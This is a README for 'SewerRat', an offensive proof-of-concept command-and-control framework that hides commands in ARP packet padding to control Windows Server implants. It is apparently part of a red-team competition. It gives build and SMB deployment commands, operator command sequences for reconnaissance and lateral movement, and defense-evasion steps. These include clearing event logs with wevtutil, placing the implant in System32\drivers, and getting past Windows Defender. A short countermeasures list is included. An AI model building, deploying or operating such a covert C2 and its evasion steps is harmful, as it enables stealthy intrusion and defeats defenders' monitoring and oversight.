# SewerRat: Layer 2 Command & Control Framework

```
╔═══════════════════════════════════════════════════════════════╗
║                      SewerRat C2 (PoC)                        ║
║                 Layer 2 ARP-Based Stealth C2                  ║
║                                                               ║
║  "Under the radar of EDR/NDR that watches layer 3+"           ║
╚═══════════════════════════════════════════════════════════════╝
```

## Overview

**SewerRat** is a proof-of-concept **Layer 2 Command & Control framework** that embeds command and response data in ARP packet padding to bypass traditional socket-based detection, firewall rules, and EDR network monitoring.

### Key Features

✅ **Layer 2 Stealth** — Operates at Data Link layer (ARP), not TCP/UDP  
✅ **No Sockets** — Implant creates no listening ports (netstat-proof)  
✅ **Firewall-Silent** — ARP is never blocked (it's essential for network function)  
✅ **Packet Embedding** — Commands/responses hidden in Ethernet padding (magic marker: `0x13 0x37`)  
✅ **Windows Target** — Focuses on Windows Server 2022 with SMB lateral movement  
✅ **Lightweight Implant** — Single static Go binary, ~6MB, minimal memory overhead  
✅ **Interactive C2** — Real-time command execution from Linux operator  
✅ **Multi-Implant** — Broadcast to all targets or unicast to specific MAC  

---

## Project Structure

```
sewerrat/
├── shared/                 # Shared protocol layer (encoding, crypto)
│   ├── constants.go        # Magic markers, timing, limits
│   ├── protocol.go         # Payload encode/decode functions
│   └── crypto.go           # XOR cipher (PoC; disable by default)
│
├── implant/                # Windows beacon code
│   ├── network.go          # Network interface detection
│   ├── sniffer.go          # ARP packet capture & filtering
│   ├── executor.go         # Command execution engine
│   └── broadcaster.go      # ARP response sender
│
├── server/                 # Linux C2 server
│   ├── broadcaster.go      # Command broadcaster
│   ├── listener.go         # Response listener
│   └── cli.go              # Interactive CLI handler
│
├── cmd/                    # Entry points
│   ├── implant/main.go     # Windows implant binary
│   └── server/main.go      # Linux server binary
│
├── scripts/
│   └── deploy.py           # SMB lateral movement helper
│
├── docs/                   # Comprehensive documentation
│   ├── DEVELOPMENT.md      # Build & development guide
│   ├── PROTOCOL.md         # Technical protocol specification
│   ├── USAGE.md            # Operator usage guide
│   └── TESTING.md          # Validation & testing procedures
│
├── Makefile                # Build automation
└── go.mod                  # Go module dependencies
```

---

## Quick Start

### 1. Build

```bash
cd sewerrat/
make all
# Outputs: dist/SewerRat.exe (Windows) + dist/sewerrat-server (Linux)
```

### 2. Deploy to Windows Target

```bash
# Option A: Manual
# 1. Install Npcap on Windows: https://nmap.org/npcap/
# 2. Copy SewerRat.exe to C:\Windows\System32\drivers\
# 3. Run: SewerRat.exe

# Option B: Automated SMB
python3 scripts/deploy.py -t 10.0.0.5 -u administrator -p 'P@ssw0rd!'
```

### 3. Run C2 Server (Linux)

```bash
sudo ./dist/sewerrat-server -i eth0
```

### 4. Send Commands

```
sewerrat> broadcast whoami
[>>] Sent command: whoami
[*] Waiting for responses...
[<<] 00:11:22:33:44:55: DOMAIN\Administrator

sewerrat> send 00:11:22:33:44:55 ipconfig /all
[<<] 00:11:22:33:44:55: Windows IP Configuration...

sewerrat> exit
```

---

## How It Works

### The Protocol

1. **Implant Beacon:** Windows target sends ARP Request for non-existent IP (10.255.255.254) with "READY" in padding
2. **Command Delivery:** Linux server responds with ARP Reply containing command in padding
3. **Execution:** Implant sniffs for magic marker (0x13 0x37), extracts command, executes with `cmd /c`, and broadcasts response
4. **Response:** Output is chunked into 20-byte blocks and returned via ARP Replies

### Why It Works

| Detection Method | Result |
|---|---|
| **Netstat** | No listening ports (no sockets created) ✓ |
| **Firewall** | ARP is pre-approved (Layer 2) ✓ |
| **EDR Socket Monitoring** | No TCP/UDP connections (Layer 3+) ✓ |
| **DNS Logs** | No queries (uses ARP only) ✓ |
| **Command Line Logging** | Implant is dormant, only executes on request ✓ |
| **Network IDS** | Blends with legitimate ARP noise (with jitter) ✓ |

---

## Requirements

### For Building
- **Go 1.20+**
- **GNU Make** (or manual `go build` commands)
- **git** (for cloning, optional)

### For Running Implant
- **Windows Server 2022** (target)
- **Npcap** installed (packet capture library)
- Administrator privileges

### For Running Server
- **Linux** (Kali, Ubuntu, Debian, CentOS, etc.)
- **Root or sudo access** (for packet capture)
- Network access to target (same LAN)

---

## Documentation

| Document | Purpose |
|---|---|
| [DEVELOPMENT.md](docs/DEVELOPMENT.md) | Build, compile, troubleshooting |
| [PROTOCOL.md](docs/PROTOCOL.md) | Technical ARP C2 protocol details |
| [USAGE.md](docs/USAGE.md) | Operating the C2 server, command reference |
| [TESTING.md](docs/TESTING.md) | Lab validation, reliability testing |

**Start here:** Read [DEVELOPMENT.md](docs/DEVELOPMENT.md) to build, then [USAGE.md](docs/USAGE.md) to operate.

---

## Example Workflow

### Reconnaissance

```bash
sewerrat> broadcast whoami
sewerrat> broadcast systeminfo
sewerrat> broadcast ipconfig /all
sewerrat> broadcast net user /domain
```

### Privilege Escalation Check

```bash
sewerrat> send 00:11:22:33:44:55 whoami /priv
sewerrat> send 00:11:22:33:44:55 whoami /groups
```

### Lateral Movement

```bash
sewerrat> broadcast net view \\10.0.0.0
sewerrat> broadcast net share
```

### Defense Evasion

```bash
sewerrat> broadcast wevtutil cl Security
sewerrat> broadcast wevtutil cl System
```

---

## Performance Characteristics

| Metric | Value |
|---|---|
| **Command Latency** | 2-5 seconds (plus jitter) |
| **Max Command Size** | 1024 bytes (chunked into 20-byte ARP packets) |
| **Max Response Size** | 4096 bytes (output capped) |
| **Network Overhead** | ~100 bytes per command/response |
| **Implant Memory** | 5-10 MB (Go runtime) |
| **Implant CPU** | Idle in pcap loop; <1% when executing |

---

## Security & Evasion

### Current PoC Implementation

- ✗ No encryption (optional XOR stub available)
- ✗ Hardcoded magic marker (0x13 0x37)
- ✗ No authentication
- ✗ Timing patterns may be detectable by IDS

### For Production Red-Teaming

1. **Enable Encryption:** Set `EncryptEnabled = true` in `shared/crypto.go`
2. **Rotate Magic Marker:** Derive from target credentials/AD
3. **Add Authentication:** HMAC signature on commands
4. **Jitter Strategy:** Randomize beacon intervals, trigger IP, padding entropy
5. **Cleanup:** Clear Windows Event Logs after operations

---

## Limitations & Evasion Bypass Vectors

### Current Limitations

- **Limited to LAN:** ARP is not routed (no cross-VLAN by default)
- **DAI Detection:** Dynamic ARP Inspection can flag spoofing
- **IDS Pattern:** Anomalous ARP to non-existent IP evident in pcap
- **Payload Size:** Max 4KB response (large exfiltration requires multiple ops)

### Blue Team Countermeasures

- **Dynamic ARP Inspection (DAI)** — Validates ARP binding on virtual switch
- **ARP monitoring IDS** — Detects unsolicited ARP traffic (Snort, Zeek)
- **Netflow anomaly detection** — Unusual ARP patterns
- **PCAP review** — Finding magic marker in padding (0x13 0x37)

---

## Building for Different Platforms

### Windows Implant (from Linux)

```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" \
  -o dist/SewerRat.exe ./cmd/implant
```

### Linux Server (from Windows with WSL2)

```bash
wsl make server
```

### Local Testing (current OS)

```bash
make dev
# Builds architecture-native binaries for testing
```

---

## Troubleshooting

### Build Issues

- **"go: github.com/google/gopacket: version not found"** → `go get -u github.com/google/gopacket`
- **Cross-compile fails** → Use WSL2 or Docker; ensure GOOS/GOARCH set correctly

### Runtime Issues

- **"Failed to open interface"** → Check interface name (`ip link show`), ensure sudo
- **"No response received"** → Verify implant is running, check network connectivity, increase timeout
- **Windows Defender blocks implant** → Add to exclusions or obfuscate

### Network Issues

- **ARP doesn't cross VLAN** → Add static ARP entry or use routing
- **IDS blocks traffic** → Increase jitter, randomize patterns, consider wire speed limitations

---

## Competition Notes (HW#4)

**Target:** Windows Server 2022 ("Sewers" SMB box)  
**Deployment:** Via SMB lateral movement (impacket-smbexec or deploy.py)  
**Advantage:** Layer 2 stealth, no socket detection, minimal EDR footprint  
**Scoring:** Demonstrates understanding of OSI model, evasion techniques, custom C2 development  

---

## Credits & References

- **Packet Crafting:** [google/gopacket](https://github.com/google/gopacket)
- **Design Inspiration:** F-Secure C3, Metasploit, custom Layer 2 techniques
- **Documentation Reference:** [ARP RFC 826](https://tools.ietf.org/html/rfc826)

---

## License & Disclaimer

This is a **proof-of-concept educational tool** for authorized red team exercises only.  
**Unauthorized access** to computer systems is **illegal**.  
Use only in controlled lab environments or authorized engagements.

---

## Quick Reference

```bash
# Build
cd sewerrat && make all

# Deploy
python3 scripts/deploy.py -t 10.0.0.5 -u admin -p pass

# Run Server
sudo ./dist/sewerrat-server -i eth0

# Commands (in server)
broadcast whoami           # Send to all
send 00:11:22:33:44:55 id # Send to specific MAC
help                      # Show help
exit                      # Exit
```

---

**For detailed guides, see [docs/](docs/) folder.**

**Questions?** Review code comments or examine packet captures with Wireshark.

---

Generated: March 15, 2026  
Project: SewerRat C2 PoC  
Status: Implementation Complete ✓
